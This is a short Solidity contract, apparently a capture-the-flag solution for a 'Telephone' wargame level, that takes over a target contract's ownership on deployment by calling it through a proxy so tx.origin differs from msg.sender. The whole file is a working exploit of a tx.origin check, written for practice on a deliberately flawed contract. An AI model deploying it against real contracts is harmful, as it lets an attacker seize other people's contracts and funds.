// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneHack {
	constructor(address telephoneAddr) {
		Telephone t = Telephone(telephoneAddr);
		// NOTE the contract works as proxy so tx.origin != msg.sender
		t.changeOwner(msg.sender);
	}
}
